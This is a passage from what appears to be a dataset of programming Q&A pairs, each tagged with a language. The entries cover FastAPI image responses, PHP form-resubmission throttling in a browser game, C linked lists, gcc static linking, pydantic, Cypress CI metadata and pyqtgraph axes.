    # arr = cv2.cvtColor(arr, cv2.COLOR_RGBA2BGRA) # if dealing with 4-channel RGBA (transparent) image

    success, im = cv2.imencode('.png', arr)
    headers = {'Content-Disposition': 'inline; filename=""test.png""'}
    return Response(im.tobytes(), headers=headers, media_type='image/png')

Client side:
On client side, you can write the raw bytes to a file, or use the numpy.frombuffer() function and cv2.imdecode() function to decompress the buffer into an image format (similar to this)—cv2.imdecode() does not require a file extension, as the correct codec will be deduced from the first bytes of the compressed image in the buffer.
url = 'http://127.0.0.1:8000/image'
r = requests.get(url=url) 

# write raw bytes to file
with open('test.png', 'wb') as f:
    f.write(r.content)

# or, convert back to image format    
# arr = np.frombuffer(r.content, np.uint8)
# img_np = cv2.imdecode(arr, cv2.IMREAD_UNCHANGED)
# cv2.imwrite('test.png', img_np)


Useful Information
Since you noted that you would like the image displayed similar to a FileResponse, using a custom Response to return the bytes should be the way to do this, instead of using StreamingResponse (as shown in your question). To indicate that the image should be viewed in the browser, the HTTP response should include the following header, as described here and as shown in the above examples (the quotes around the filename are required, if the filename contains special characters):
headers = {'Content-Disposition': 'inline; filename=""test.png""'}

Whereas, to have the image downloaded rather than viewed (use attachment instead):
headers = {'Content-Disposition': 'attachment; filename=""test.png""'}

If you would like to display (or download) the image using a JavaScript interface, such as Fetch API or Axios, have a look at the answers here and here.
As for the StreamingResponse, if the entire numpy array/image is already loaded into memory, StreamingResponse is not necessary at all (and certainly, should not be the preferred choice for returning the image to the client). StreamingResponse streams by iterating over the chunks provided by your iter() function (if Content-Length is not set in the headers—unlike StreamingResponse, other Response classes set that header for you, so that the browser will know where the data ends). As described in this answer:

Chunked transfer encoding makes sense when you don't know the size of
your output ahead of time, and you don't want to wait to collect it
all to find out before you start sending it to the client. That can
apply to stuff like serving the results of slow database queries, but
it doesn't generally apply to serving images.

Even if you would like to stream an image file that is saved on the disk, file-like objects, such as those created by open(), are normal iterators; thus, you could return them directly in a StreamingResponse, as described in the documentation and as shown below (if you find yield from f being rather slow, when using StreamingResponse, please have a look at this answer on how to read the file in chunks with the chunk size of your choice—which should be set based on your needs, as well as your server's resources). It should be noted that using FileResponse would also read the file contents into memory in chunks, instead of the entire contents at once. However, as can be seen in the implementation of FileResponse class, the chunk size used is pre-defined and set to 64KB. Thus, based on one's requirements, they should decide on which of the two Response classes they should use.
@app.get('/image')
def get_image():
    def iterfile():  
        with open('test.png', mode='rb') as f:  
            yield from f  
            
    return StreamingResponse(iterfile(), media_type='image/png')

Or, if the image was loaded into memory instead and then saved into a BytesIO buffered stream, in order to return the bytes, since BytesIO is a file-like object (like all the concrete classes of io module), it means that you could return it directly in a StreamingResponse (or, preferably, simply call buf.getvalue() to get the entire image bytes and return them using a custom Response directly, as shown earlier). In the example below, remember to call buf.seek(0), in order to rewind the cursor to the start of the buffer, as well as call close() inside a background task, in order to discard the buffer, once the response has been sent to the client.
from fastapi import BackgroundTasks

@app.get('/image')
def get_image(background_tasks: BackgroundTasks):
    # supposedly, the buffer already existed in memory
    arr = create_img()
    im = Image.fromarray(arr)
    buf = BytesIO()
    im.save(buf, format='PNG')

    # rewind the cursor to the start of the buffer
    buf.seek(0)
    # discard the buffer, after the response is returned
    background_tasks.add_task(buf.close)
    return StreamingResponse(buf, media_type='image/png')

Thus, for your case scenario, the most suited approach would be to return a custom Response with your custom content and media_type, as well as set the Content-Disposition header, as described above, so that the image is viewed in the browser.
Option 2 - Return image as JSON-encoded numpy array
The below should not be used for displaying the image in the browser, but it is rather added here for the sake of completeness, showing how to convert an image into a numpy array (preferably, using asarray() function), then return the data in JSON format, and finally, convert the data back to image on client side, as described in this and this answer. For faster alternatives to the standard Python json library, see this answer.
Using PIL
Server side:
from PIL import Image
import numpy as np
import json

@app.get('/image')
def get_image():
    im = Image.open('test.png')
    # im = Image.open('test.png').convert('RGBA') # if dealing with 4-channel RGBA (transparent) image 
    arr = np.asarray(im)
    return json.dumps(arr.tolist())

Client side:
import requests
from PIL import Image
import numpy as np
import json

url = 'http://127.0.0.1:8000/image'
r = requests.get(url=url) 
arr = np.asarray(json.loads(r.json())).astype(np.uint8)
im = Image.fromarray(arr)
im.save('test_received.png')

Using OpenCV
Server side:
import cv2
import json

@app.get('/image')
def get_image():
    arr = cv2.imread('test.png', cv2.IMREAD_UNCHANGED)
    return json.dumps(arr.tolist())

Client side:
import requests
import numpy as np
import cv2
import json

url = 'http://127.0.0.1:8000/image'
r = requests.get(url=url) 
arr = np.asarray(json.loads(r.json())).astype(np.uint8)
cv2.imwrite('test_received.png', arr)

",python
preventing spamming of the functionality of a php page,"The background:
Ok, I run a legacy BBG over at ninjawars.net.  There is an ""attack"" that players can make on other players that is initialized via form post.  Essentially, we can simplify the situation to pretend that there's a page, lets call it attack.php, with a giant ""ATTACK"" form post that submits to another php page, lets call it accept_attack.php, and the second page performs the attack functionality, lets say killing other player 1, 2, or 3.
The server runs PHP5, Postgresql, Apache
The problems:

If I hit that big ""ATTACK"" button, and it brings me to the accept_attack.php, I can then hit refresh three times, resubmitting each time, to attack again three times in succession.
If I open up three tabs of the first page, and hit attack on each page, I end up with three instantaneous attacks that kill players 1, 2, and 3 all at once, and I can just continually refresh to repeat.
Despite my attempts to have a ""most recent attack"" timer that gets saved to the database, players seem to be able to work around it, perhaps just by refreshing three copied tabs in a synchronized enough way, so that they may all retrieve the same timer (e.g. 10:00:00:0000 am) and thus proceed with the resulting processing.

The solution needed: 
So how do I prevent the same processing of a certain script from being preformed all at once in triplicate?
Php, Social engineering, and/or javascript/jQuery solutions preferred (probably in about that order).
Edit:
Based on the answers, here's what I did to (potentially, before stress testing) solve it:
The session answer seemed simplest/most comprehensible to implement, so I used that data store.  I tested it and it seems to work, but there may be ways around it that I'm not aware of.
$recent_attack = null;
$start_of_attack = microtime(true);
$attack_spacing = 0.2; // fraction of a second
if(SESSION::is_set('recent_attack')){
    $recent_attack = SESSION::get('recent_attack');
}

if($recent_attack && $recent_attack>($start_of_attack-$attack_spacing)){
    echo ""<p>Even the best of ninjas cannot attack that quickly.</p>"";
    echo ""<a href='attack_player.php'>Return to combat</a>"";
    SESSION::set('recent_attack', $start_of_attack);
    die();
} else {
    SESSION::set('recent_attack', $start_of_attack);
}

If there're ways to improve on that or ways that that is exploitable (beyond the one obvious to me that echoing stuff isn't a good seperation of logic, I'd love to know.  Along those lines, community-wiki-ed.
","Similar to Godeke's solutions.  Couldn't you generate a token with a hidden field on the ""Attack"" button form and store that in a session? Then on the accept-attack.php page you would check if the $_POST['token'] == $_SESSION['token']. 
so you would have something similar to this on the accept-attack.php page

      if($_POST['token'] == $_SESSION['token']){
       echo 'no cheating!';
            // or redirect to the attach page
   }else{
         $_SESSION['token'] = $_POST['token'];
         // then perform the attack
   } 

 
",javascript
how can i detect device touch support in javascript,"In the past, when detecting whether a device supports touch events in JavaScript, we could do something like this:
var touch_capable = ('ontouchstart' in document.documentElement);

However, Google Chrome (17.x.x+) returns true for the above check, even if the underlying device does not support touch events. For example, running the above code on Windows 7 returns true, and thus if we combine it with something like:
var start_evt = (touch_capable) ? 'ontouchstart' : 'onmousedown';

On Google Chrome, the event is never fired since we're binding to ontouchstart. In short, does anyone know a reliable way to circumvent this? I am currently running the following check:
var touch_capable = ('ontouchstart' in document.documentElement && navigator.userAgent.toLowerCase().indexOf('chrome') == -1)

Which is far from ideal...
","The correct answer is to handle both event types - they're not mutually exclusive.
For a more reliable test for touch support, also look for window.DocumentTouch && document instanceof DocumentTouch which is one of the tests used by Modernizr
Better yet, just use Modernizr yourself and have it do the feature detection for you.
Note though that you cannot prevent false positives, hence my first line above - you've got to support both.
",javascript
how to step through python code to help debug issues,"In Java/C# you can easily step through code to trace what might be going wrong, and IDE's make this process very user friendly.
Can you trace through python code in a similar fashion?
","Yes! There's a Python debugger called pdb just for doing that!
You can launch a Python program through pdb via python -m pdb myscript.py.
There are a few commands you can then issue, which are documented on the pdb page.
Some useful ones to remember are:

b: set a breakpoint
c: continue debugging until you hit a breakpoint
s: step through the code
n: to go to next line of code
l: list source code for the current file (default: 11 lines including the line being executed)
u: navigate up a stack frame
d: navigate down a stack frame
p: to print the value of an expression in the current context

If you don't want to use a command line debugger, some IDEs like Pydev, Wing IDE or PyCharm have a GUI debugger. Wing and PyCharm are commercial products, but Wing has a free ""Personal"" edition, and PyCharm has a free community edition.
",python
what exactly is meant by quotpartial functionquot in functional programming,"According to my understanding, partial functions are functions that we get by passing fewer parameters to a function than expected. For example, if this were directly valid in Python:
>>> def add(x,y):
...    return x+y
... 
>>> new_function = add(1)
>>> new_function(2)
3

In the snippet above, new_function is a partial function. However, according to the Haskell Wiki, the definition of partial function is 

A partial function is a function that is not defined for all possible arguments of the specified type.

so, my question is: what exactly is meant by ""partial function""?
","You are here confusing two concepts. A partially applied function [haskell-wiki] with a partial function [haskell-wiki].
A partially applied function is:

Partial application in Haskell involves passing less than the full number of arguments to a function that takes multiple arguments.

whereas a partial function indeed is a non-total function:

A partial function is a function that is not defined for all possible arguments of the specified type.

",python
pydantic  parse a list of objects from yaml configuration file,"I want to read a list of objects from a YAML file:
- entry1:
   attribute: ""Test1""
   amount: 1
   price: 123.45
- entry2:
   attribute: ""Test1""
   amount: 10
   price: 56.78

For this data structure i created three nested models as follows:
# Models
class EntryValues(BaseModel):
    attribute: str
    amount: int
    price: float

class Entry(BaseModel):
    entry1: EntryValues
    entry2: EntryValues
class Config(BaseModel):
    __root__: list[Entry]


My code to read the YAML config file looks as follows:
# get YAML config path
def get_cfg_path() -> Path:
    return CWD

# read YAML file
def read_cfg(file_name: str, file_path: Path = None) -> YAML:
    if not file_path:
        file_path = get_cfg_path()

    if file_path:
        try:
            file = open(file_path / file_name, ""r"")
        except Exception as e:
            print(f""open file {file_name} failed"", e)
            sys.exit(1)
        else:
            return load(file.read())
    else:
        raise Exception(f""Config file {file_name} not found!"")

Now i want to unpack the values of the YAML to my model. For that i tried to unpack the values with the ** operator. I think im missing one more loop here though, but i can not get it work.
# Unpack and create config file
def create_cfg(file_name: str = None) -> Config:
    config_file = read_cfg(file_name=file_name)
    _config = Config(**config_file.data)
    return _config

I would appreciate any help.
Update
So i played around with my model-structure a bit without using the YAML file. I dont quite get why the following throws an ValidationError:
Consider the following list of entries (thats the same data structure i would receive from my YAML file):
entries = [
    {'entry1': {'attribute': 'Test1', 'amount': 1, 'price': 123.45}}, 
    {'entry2': {'attribute': 'Test2', 'amount': 10, 'price': 56.78}}
]

If i run the following simple loop, then Pydantic throws an ValidationError:
for entry in entries:
    Entry(**entry)

Error:
ValidationError: 1 validation error for Entry
entry2
  field required (type=value_error.missing)

However, if the list only contains one entry dictionary, then it works:
class Entry(BaseModel):
    entry1: EntryValues
    #entry2: EntryValues

entries = [
    {'entry1': {'attribute': 'Test1', 'amount': 1, 'price': 123.45}}
]

for entry in entries:
    Entry(**entry)

Can someone explain this or what im doing wrong here?
","In your update, the reason that the second case works but not the first is that the unpacking operator (**) takes a single dictionary object which contains all the necessary keys. In your first case, you had one dictionary with all the necessary info; in the second it is spread across two dicts and they can't be unpacked together. One possible workaround would be to merge them into a single dictionary. But as far as I understand, a better solution would be to just change your YAML to provide this in the first place, by deleting the first two characters in each line:
entry1:
 attribute: ""Test1""
 amount: 1
 price: 123.45
entry2:
 attribute: ""Test1""
 amount: 10
 price: 56.78

and then:
_config = Config(__root__=[Entry(**entries)])

Original answer:
There are a number of issues with your code, but I think what you're trying to do is parse the YAML into a dictionary and instantiate an EntryValues from each item. That would look something like this:
from pydantic import BaseModel
from pathlib import Path
from typing import List

import yaml


def create_cfg(file_name: str = None) -> Config:
    config_file = read_cfg(file_name=file_name)
    entries = yaml.safe_load(config_file)
    _config = [
        EntryValues(**di[name]) for di, name in zip(entries, [""entry1"", ""entry2""])
    ]
    return _config

",python
why do i get write access violation,"I get a write access violation when I debug the following code. In two lines, the exception is thrown, according to the debugger. These lines are commented as write access violation in the code below.
#include <stdio.h>

struct Lnode {
    int value;
    struct Lnode* next;
};

struct List {
    struct Lnode* head;
    struct Lnode* tail;
};

void listAdd(struct List* x, int val) {
    struct Lnode* y;
    y = (struct Lnode*)malloc(sizeof(struct Lnode)); // write access violation
    y->value = val; // write access violation

    if (x->head == NULL) {
        x->head = y;
        x->tail = y;
    }
    else {
        struct Lnode *currentNode;
        currentNode = x->head->next;
        while (currentNode) {
            if (currentNode->next == NULL) {
                currentNode->next = y;
                x->tail = y;
                break;
            }
            currentNode = currentNode->next;
        }
    }
}

struct Lnode* listFind(struct List* x, int value) {
    if (x->head->value == value) {
        return x->head;
    }
    else if (x->tail->value == value) {
        return x->tail;
    }
    else {
        struct Lnode* currentNode = x->head->next;
        while (currentNode) {
            if (currentNode->value == value) {
                return currentNode;
            }
            currentNode = currentNode->next;
        }
    }
    return NULL;
}

int main() {
    struct List* myList = (struct List*)malloc(sizeof(struct List));

    listAdd(myList, 10); 
    listAdd(myList, 20);
    printf(""%d"", listFind(myList, 10)->value);
    printf(""%d"", listFind(myList, 20)->value);
    return 0;
}

I am trying to use malloc to allocate memory for a struct. In this example I am trying to create a linked list. However, the exception is causing my program to fail.
","Here are the bugs that I see.  It is not necessarily a complete list.  I leave it to you to work out how to fix them.

You forgot #include <stdlib.h> to use malloc.  (You should get a lot of compiler warnings about that.)

After struct List* myList = malloc(...) the contents of *myList are uninitialized (garbage), but your program expects both its head and tail members to be NULL.  You have to set them explicitly.

In listAdd, if the list is empty, you add the new node to it, but its next member remains uninitialized, rather than being NULL as your program needs.  Again, you need to initialize it.

In listAdd, if the list contains exactly one node, then the next member of that node will be NULL, so setting currentNode = x->head->next;  results in currentNode = NULL.  This causes the while (currentNode) loop to terminate immediately without adding the new node.

You're missing \n at the end of your printf format strings, so the values printed will be run together, and your program outputs 1020 which I don't think is what you want.


And some general code review advice:

Your listFind as written won't work if passed an empty list.

Your listFind could be considerably simpler; the head and tail nodes do not need to be special cases, if you write it properly.

Should I cast the result of malloc (in C)? No.

listFind(myList, 10)->value is dangerous in general: if the value is not found, then listFind() returns NULL, and so dereferencing it (by applying the -> operator) would crash.  You should check the return value before dereferencing.  This is basic error checking practice.
I realize that in this case, if everything is working then the value will be found - but your code does not actually work yet.  As a result, after fixing bugs 1-3 above, bug 4, which by itself only results in incorrect list contents rather than a crash, still causes the program to crash because 20 is not found (because listAdd didn't insert it properly).  If you had proper error checking, the program could fail more gracefully, and would be easier to debug.

Likewise, as the other answer said, you should also check the return value of malloc, every time, and fail gracefully if it is NULL (out of memory).

One of the main reasons to have a tail pointer in a linked list is so that you can add a node at the end without needing to iterate through the entire list to locate the end.  Such an operation could be O(1), but in your code it is O(n), which is needlessly inefficient.


",c
how to populate author branch commit message in cypres dashboard in ci with jenkins,"I'm trying to get the commit information details in the Cypress Dashboard. I haven't been able to accomplish just yet, but I have made some advances though...
I'll describe what I have done so far:

Installed the commit-info npm package by running the command:

npm install --save @cypress/commit-info

Import the plugin in plugin/index.js file like so:

const { commitInfo } = require('@cypress/commit-info');

module.exports = on => {
  on('file:preprocessor', file => {
    commitInfo().then(console.log);
  });
};

Now I get all the information, author, branch, commit & message, in the terminal!:)
However, I still don't have the information details linked to my Cypress Dashboard.
This is what I currently get:

What're the next steps? The documentation is not clear to me...
","In our case we run everything inside a docker container.  We copy our code into the container but do not copy the .git directory, it's large, time consuming, and we don't need it.  @cypress/commit-info assumes there is a .git directory, so since there isn't, it doesn't work.
We overcame this by setting the values cypress expects explicitly in the cypress run command in our Jenkinsfile:
def commitMessage = sh(script:""git log --format=%B -n 1 ${env.GIT_COMMIT}"", returnStdout:true).trim()
def commitAuthor = sh(script:""git log --format='%an' -n 1 ${env.GIT_COMMIT}"", returnStdout:true).trim()
def commitEmail = sh(script:""git log --format='%ae' -n 1 ${env.GIT_COMMIT}"", returnStdout:true).trim()

def cypressVars = ""COMMIT_INFO_BRANCH=${env.GIT_BRANCH} COMMIT_INFO_SHA=${env.GIT_COMMIT} COMMIT_INFO_REMOTE=${env.GIT_URL} COMMIT_INFO_MESSAGE=\""${commitMessage}\"" COMMIT_INFO_AUTHOR=\""${commitAuthor}\"" COMMIT_INFO_EMAIL=${commitEmail}""

// call cypress however you do and include cypressVars as part of the command

",javascript
restrictions on non volatile variables in c,"I Would like to understand what Restrictions if any does the compiler have with regards to non volatile variables in C.
I'm not sure if its true or not, but I've been told that if you have the following code:
int x;
...
void update_x() {
  lock();
  x = x*5+3;
  unlock();
} 

You must acquire the lock to read x because even tough the compiler is unlikely to do it is technically legal for it to store intermediate calculation such as x*5 into x, and so the read might read an intermediate value. so my first question is whether it is indeed the case? if not, why not?
If it is, I have a followup question, is there anything that's prevents to compiler from using x as a temporary storage before or after taking the lock? (Assuming the compiler can prove that a single thread executing the program will not notice it).
If not, does that mean that any program that has non volatile shared variables is technically undefined even if all the accesses are protected by locks?
Thanks,
Ilya
","Prior to C11, the answer is No, as the spec doesn't define anything about what multiple threads do, so any program that uses multiple threads where one thread writes an object and another thread reads it is undefined behavior.
With C11, there's actually a memory model that talks about multiple threads and data races, so the answer is Yes, as long as the lock/unlock routines do certain synchronization operations (involving either library functions that do the synchronization or operations on special _Atomic objects).
Since the C11 spec is attempting to codify behavior of existing implementations (for the most part), it is likely that any code that does what it requires (ie, using a implementation provided library for locking, or implementation provided extensions for atomic operations) will work correctly even on pre-C11 implementations.
Section 5.2.1.4 of the C11 spec covers this.
",c
item in an object is undefined when called,"So I am trying to make a weather app, using openWeatherAPI, and I need the lattitude and longitude of a location
First off, the desired location (city) is put into the geocode class, so that it can be converted into an object with the city name, lon, and lat.
The thing is, when I use the lon and lat values, they appear as undefined, but when you call the whole object itself, it shows all the values as they should be.
This is my index.js:
import Search from ""./models/search"";
import GeoCode from ""./models/geocode"";

const geocode = new GeoCode(""toronto"");
const weather = new Search(geocode.lat, geocode.lon);

console.log(geocode);
console.log(weather);

This is my geocode converter API module (geocode.js):
import axios from ""axios"";

export default class Geocode{
    constructor(city){
        this.city = city;
        
        this.getLatLong();
    }

    async getLatLong(){
        try{
            const res = await axios(`https://us1.locationiq.com/v1/search.php?key=${key}&q=${this.city}&format=json`);

            this.lat = JSON.parse(res.data[0].lat);
            this.lon = JSON.parse(res.data[0].lon);
        }catch(err){
            console.log(err)
        }
    }
    
}

and this is my search module, where it contacts the api to search using lon and lat (search.js):
import axios from ""axios"";

export default class Search{
    constructor(lat, lon){
        this.lat = lat;
        this.lon = lon;

        this.getResults();
    }

    async getResults() {
        try {
            const res = await axios(`https://api.openweathermap.org/data/2.5/onecall?lat=${this.lat}&lon=${this.lon}&%20exclude=daily&appid=${key}&units=metric`);
            this.result = res;
        }catch(error){
            alert(error);
        }
    }
}

This is also what I get in the console:
Geocode {city: ""toronto""}

Search {lat: undefined, lon: undefined}

","Change this:
import Search from ""./models/search"";
import GeoCode from ""./models/geocode"";

const geocode = new GeoCode(""toronto"");
const weather = new Search(geocode.lat, geocode.lon);

console.log(geocode);
console.log(weather);

To this:
import Search from ""./models/search"";
import GeoCode from ""./models/geocode"";

(async () => {
  const geocode = new GeoCode(""toronto"");
  await geocode.getLatLong();

  const weather = new Search(geocode.lat, geocode.lon);
  await weather.getResults();

  console.log(geocode);
  console.log(weather);
})();

Also remove this.getLatLong(); from geocode.js, and remove this.getResults(); from search.js.
",javascript
how can i compile a library archive with a source code file with gcc,"TL;DR - I need to compile archive.a with test.o to make an executable.
Background - I am trying to call a function in a separate library from a software package I am modifying but the function (a string parser) is creating a segmentation violation. The failure is definitely happening in the library and the developer has asked for a test case where the error occurs. Rather than having him try to compile the rather large software package that I'm working on I'd rather just send him a simple program that calls the appropriate function (hopefully dying at the same place). His library makes use of several system libraries as well (lapack, cblas, etc.) so the linking needs to hit everything I think.
I can link to the .o files that are created when I make his library but of course they don't link to the appropriate system libraries.
This seems like it should be straight forward, but it's got me all flummoxed.
","The .a extension indicates that it is a static library. So in order to link against it you can use the switches for the linking stage:
gcc -o myprog -L<path to your library> main.o ... -larchive

Generally you use -L to add the path where libraries are stored (unless it is in the current directory) and you use -l<libname> to sepecify a library. The libraryname is without extension. If the library is named libarchive.a you would still give -larchive.
If you want to specify the full name of the library, then you would use i.e. -l:libname.a 
update
If the libraypath is /usr/lib/libmylibrary.a you would use
-L/usr/lib -lmylibrary

",c
quotcannot find symbol methodquot but the method is declared,"In my driver program, this line gives me cannot find symbol error and I don't know why. The method is clearly defined in the SavingsAccount class, and I can refer to all other methods in my driver program but just not that one, I tried changing the type to double, and etc but still not working.
Account acct2 = new SavingsAccount (name);
acct2.calculateBalance();

SavingsAccount class inherits from Account class:
public class SavingsAccount extends Account
{
    private final short minBalance = 0;
    private double overdraftFee;
    private double yearlyInterestRate = 0.02;
    private double interestAmount;

    public SavingsAccount (String name)
    {
        super(name);
    }

    public double withdraw (double amount)
    {
        if (accountBalance - amount >= minBalance)
        {
            accountBalance -= amount;
            System.out.print (""Withdraw Successful"");
        }
        else 
        {
            accountBalance -= amount;
            overdraftFee = accountBalance * (0.10);
            accountBalance += overdraftFee;
            System.out.print (""Withdraw Succesful, however overdraft fee of 10% has been applied to your account"");


        }

        return accountBalance;
    }

// ----------------- this is the method I try to invoke -----------------------------
    public void calculateBalance ()
    {
        interestAmount = (accountBalance * yearlyInterestRate);
        accountBalance += interestAmount;
    }
// ----------------------------------------------------------------------------------

    public String toString()
    {
        return super.toString() + "" Interest Received: "" + interestAmount;
    }


}

Account class, if needed
import java.util.Random;
import java.text.NumberFormat;

public abstract class Account
{
    protected double accountBalance;
    protected long accountNumber;
    protected String accountHolder;
    public Account (String name)
    {
        accountHolder = name;
        accountBalance = 0;
        Random accountNo = new Random();
        accountNumber  = accountNo.nextInt(100000);
    }

    public double deposit (double amount)
    {
        accountBalance += amount;

        return accountBalance;
    }

    public String toString()
    {
        NumberFormat accountBal = NumberFormat.getCurrencyInstance();
        return ""Account Balance: "" + accountBal.format(accountBalance) + ""\nAccount Number: "" + accountNumber;
    }

    public String getAccountHolder()
    {
        return accountHolder;
    }

    public double getAccountBalance()
    {
        return accountBalance;
    }

    public abstract double withdraw (double amount);

}

","Account acct2 = new SavingsAccount (name);
acct2.calculateBalance();

This is because although you have an object of SavingsAccount you are using refrence variable of type Account so you can access only those methods that are there in Account class.
And you don't have calculateBalance() method in your Account class. 
That's why you are not able to access it and compiler complains that it cannot find a method named calculateBalance  as it sees that reference type is Account and there is no such method inside Account class.
If you want to use that method then change reference type to SavingsAccount :
SavingsAccount acct2 = new SavingsAccount (name);

Or you can explicitly cast it when accessing that method
((SavingsAccount) acct2).calculateBalance();

but be alert that it can throw ClassCastException if acct2 object is actually not an object of SavingsAccount
UPDATE:
But
remember that at runtime, Java uses virtual method invocation to dynamically
select the actual version of the method that will run, based on the actual instance.
",java
how to build a stable abi wheel from the pep517 build package,"Context
I am currently developping a TreeSet/TreeMap package using an underlying C RedBlack tree library. I have developped a wrapper extension and in order to limit the number of binary wheels, I have used the stable ABI. To build the package distributions, I use build with a pyproject.toml configuration file, and setuptools as the backend.
Problem
The command python -m build (or pip install .) can only build a wheel tagged -cpxx-cpxx-platform (eg -cp38-cp38-linux_x86_64.whl on Linux or -0.1.0-cp310-cp310-win_amd64.whl on Windows). Using directly setuptools with a setup.py and a setup.config file, it is possible to build a wheel tagged as cpxx-abi3-platform with the command:
python setup.py bdist_wheel --py-limited-api=cpxx

but I could not find a way to pass the py-limited-api parameter to build
Current config for a simplified example
pyproject.toml
[build-system]
requires = [""setuptools>=60.0"", ""wheel""]
build-backend = ""setuptools.build_meta""

[project]
name = ""empty""
version = ""0.1.0""
authors = [
  { name=""SBA"", email=""s-ball@laposte.net"" },
]
description = ""Simple demo""
readme = ""README.md""
license = { file=""LICENSE.txt"" }
requires-python = "">=3.8""
classifiers = [
    ""Programming Language :: Python :: 3"",
    ""License :: OSI Approved :: MIT License"",
    ""Operating System :: OS Independent"",
    ""Development Status :: 3 - Alpha"",
    ""Intended Audience :: Developers"",
    ""Programming Language :: C"",
]

setup.py
from setuptools import setup, Extension
import os.path

kwargs = dict(
    # more metadata
    ext_modules=[
        Extension('empty.ext', [os.path.join('empty', 'ext.c')],
                  py_limited_api=True,
                  )]
)

setup(**kwargs)

ext.c
#define Py_LIMITED_API 0x03070000

#define PY_SSIZE_T_CLEAN
#include <Python.h>
#include <structmember.h>

// The module object
static PyObject* mod = NULL;

/*
 * Documentation for _rbtree.
 */
PyDoc_STRVAR(ext_doc, ""Minimal extension module"");

static PyObject *say_hello(PyObject *mod, PyObject *args) {
    return PyUnicode_FromString(""Hello !"");
}

PyMethodDef methods[] = {
    {""hello"", &say_hello, METH_NOARGS, PyDoc_STR(""Simple function"")},
    {NULL},
};

static PyModuleDef ext_def = {
    PyModuleDef_HEAD_INIT,
    ""ext"",
    ext_doc,
    -1,              /* m_size */
    .m_methods=methods,
};

PyMODINIT_FUNC PyInit_ext() {
    mod = PyModule_Create(&ext_def);
    return mod;
}

and an empty __init__.py file to declare a normal package.
Current research
I could not find anything about abi3 wheels anywhere in build documentation, nor in the Python Packaging User Guide where only version tagged build packaging are documented.
Workarounds

I could produce the expected wheels by manually unpacking a version tagged wheel (wheel unpack ...whl), changing its RECORD file, and packing it back (wheel pack ...)

Reverting to a good old python setup.py ... solution can directly build the correctly tagged wheel, but I am afraid that it is now legacy if not deprecated...


","It is damned simple! The key is that if parameters cannot be passed (at least not simply) in the command line, they can be declared in config files. So here a simple solution is to add a setup.cfg with a [build_wheel] section:
[bdist_wheel]
py_limited_api=cp37

That is enough for the module in charge of the creation of the wheel to find its parameter and correctly build wheel tagged with cp37-abi3-platform
",c
what39s the canonical way to check for type in python,"How do I check if an object is of a given type, or if it inherits from a given type?
How do I check if the object o is of type str?

Editor's note: Beginners often wrongly expect a string to already be ""a number"" – either expecting Python 3.x input to convert type, or expecting that a string like '1' is also simultaneously an integer. This question does not address those types of questions. Instead, see How do I check if a string represents a number (float or int)?, How can I read inputs as numbers? and/or Asking the user for input until they give a valid response as appropriate.
","Use isinstance to check if o is an instance of str or any subclass of str:
if isinstance(o, str):

To check if the type of o is exactly str, excluding subclasses of str:
if type(o) is str:

See Built-in Functions in the Python Library Reference for relevant information.

Checking for strings in Python 2
For Python 2, this is a better way to check if o is a string:
if isinstance(o, basestring):

because this will also catch Unicode strings. unicode is not a subclass of str; both str and unicode are subclasses of basestring. In Python 3, basestring no longer exists since there's a strict separation of strings (str) and binary data (bytes).
Alternatively, isinstance accepts a tuple of classes. This will return True if o is an instance of any subclass of any of (str, unicode):
if isinstance(o, (str, unicode)):

",python
msgraph java sdk retrieve wellknow folder,"Previously with the V5 of the Microsoft Java SDK for MSGraph, to retrieve the inbox folder by it's ""well known name"", I was doing the following:
return graphClient.users(""my-email@mail.com"")
                .mailFolders(""inbox"") // hardcoded well know name in place of id
                .messages()
                .get();

But since the V6 update, I can't find anything in the help pages nor the SDK on how to achieve the same.
It looks like there is a class WellKnownFolderName in the SDK but I can't figure out how to use it.
I tried some things like
var folderId = new FolderId(WellKnownFolderName.Inbox).getUniqueId();
var inboxFolder = graphClient.me().mailFolders().byMailFolderId(folderId).get();

But folderId id is null
","You can specify the well-know name in byMailFolderId()
MailFolder result = graphClient.me().mailFolders().byMailFolderId(""inbox"").get();

",java
kotlin  lack of treemap,"Why there are no TreeMap in Kotlin ?
I know we can use the TreeMap using java utils, but this is probably not the real reason.
Do we can achieve the same using HashMap ?
","A TreeMap is different from a HashMap because it has a specific order when iterating through the elements.  The items in it will be sorted according to their natural ordering or according to whatever comparator it was built with. If you iterate over a HashMap the order of the elements will be essentially random.  In Java TreeMap is a specific type of SortedMap.
Kotlin provides similar functionality when running on the JVM. Map has a toSortedMap function which returns a sorted version of itself.  The implementation actually uses a TreeMap under the hood.  This function is missing on other Kotlin platforms, possibly because there was no corresponding TreeMap implementation available on them.
See the documentation here: https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.collections/to-sorted-map.html
",java
how can i have multiple left axisitems with the same alignmentposition using pyqtgraph,"I wonder if someone can help me out. I am trying to convert the MultiplePlotAxes.py example in pyqtgraph so that the all the axes are on the right side and aligned. Here is my code which I have added an extra plot:
""""""
Demonstrates a way to put multiple axes around a single plot.
(This will eventually become a built-in feature of PlotItem)
""""""
#import initExample  ## Add path to library (just for examples; you do not need this)

import pyqtgraph as pg
from pyqtgraph.Qt import QtCore, QtGui
import numpy as np

pg.mkQApp()

pw = pg.PlotWidget()
pw.show()
pw.setWindowTitle('pyqtgraph example: MultiplePlotAxes')
p1 = pw.plotItem
p1.setLabels(left='axis 1')

## create a new ViewBox, link the right axis to its coordinate system
p2 = pg.ViewBox()
p1.showAxis('right')
p1.scene().addItem(p2)
p1.getAxis('right').linkToView(p2)
p2.setXLink(p1)
p1.getAxis('right').setLabel('axis2', color='#0000ff')

## create third ViewBox.
## this time we need to create a new axis as well.
p3 = pg.ViewBox()
ax3 = pg.AxisItem('right')
p1.layout.addItem(ax3, 2, 3)
p1.scene().addItem(p3)
ax3.linkToView(p3)
p3.setXLink(p1)
ax3.setZValue(-10000)
ax3.setLabel('axis 3', color='#ff0000')

## create forth ViewBox.
## this time we need to create a new axis as well.
p4 = pg.ViewBox()
ax4 = pg.AxisItem('right')
p1.layout.addItem(ax4, 2, 4)
p1.scene().addItem(p4)
ax4.linkToView(p4)
p4.setXLink(p1)
ax4.setZValue(-10000)
ax4.setLabel('axis 4', color='#2EFEF7')

## Handle view resizing
def updateViews():
    ## view has resized; update auxiliary views to match
    global p1, p2, p3, p4
    p2.setGeometry(p1.vb.sceneBoundingRect())
    p3.setGeometry(p1.vb.sceneBoundingRect())
    p4.setGeometry(p1.vb.sceneBoundingRect())

    ## need to re-update linked axes since this was called
    ## incorrectly while views had different shapes.
    ## (probably this should be handled in ViewBox.resizeEvent)
